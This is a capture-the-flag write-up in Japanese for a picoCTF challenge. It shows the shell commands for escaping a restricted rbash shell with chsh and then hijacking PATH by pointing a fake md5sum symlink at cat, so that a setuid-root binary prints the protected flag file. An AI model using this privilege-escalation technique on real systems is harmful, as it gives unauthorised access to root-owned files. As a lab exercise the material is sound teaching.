# heap_only_2:bynary Medium  
Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content!  

Additional details will be available after launching your challenge instance.  

# Solution  
ssh接続する  
###とりあえず、権限や動作の結果を確認  
ctf-player@pico-chall$ ls -l  
total 0  
ctf-player@pico-chall$ echo $PATH  
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin  
ctf-player@pico-chall$ type flaghasher  
flaghasher is /usr/local/bin/flaghasher  
ctf-player@pico-chall$ flaghasher  
Computing the MD5 hash of /root/flag.txt....   
4268c8737000b13184189a06b5054d72  /root/flag.txt  

###md5sumの改ざんを試みるが失敗  
ctf-player@pico-chall$ ls -l /usr/local/bin/flaghasher  
-rwsr-xr-x 1 root root 18312 Mar  6 19:42 /usr/local/bin/flaghasher  
ctf-player@pico-chall$ ln -s /usr/bin/cat md5sum  
ctf-player@pico-chall$ export PATH=".:$PATH"  
-rbash: PATH: readonly variable  

###shellのrbashをbashに変更  
ctf-player@pico-chall$ chsh -s /usr/bin/bash ctf-player  
Password:   
ctf-player@pico-chall$ echo $SHELL  
/bin/rbash  
ctf-player@pico-chall$ logout  

###shellの変更ができたので改ざんし、フラグを獲得  
ctf-player@pico-chall$ echo $SHELL  
/usr/bin/bash  
ctf-player@pico-chall$ ln -s /usr/bin/cat md5sum  
ctf-player@pico-chall$ export PATH=".:$PATH"  
ctf-player@pico-chall$ flaghasher  
Computing the MD5 hash of /root/flag.txt....   

picoCTF{...}  

# 基礎知識  
bash:LinuxやmacOSなどのUnix系OSで使われる代表的なシェル  
rbash:bashに制限を加えた制限付きシェル　主にユーザーの操作範囲を制限する  
コマンド  
chsh:  ログインシェル（デフォルトのシェル）を変更する
例：chsh　−S　[新しいシェルのパス] [ユーザー名]   
logout:  ログインシェルを終了する  

# 考えたこと    
権限と動作結果を調査  
heap_only_1と同様書き込み権限があったので、md5sumの改ざんを行う  
改ざんは成功したが、PATHが変更できなかった  
なので、rbashをbashへの改ざんを狙う  
成功した後、ログアウトして再ログインするとシェルが変わってたのでheap_only_1と同様の手順で改ざんする  
flaghasherを実行するとフラグが獲得できた  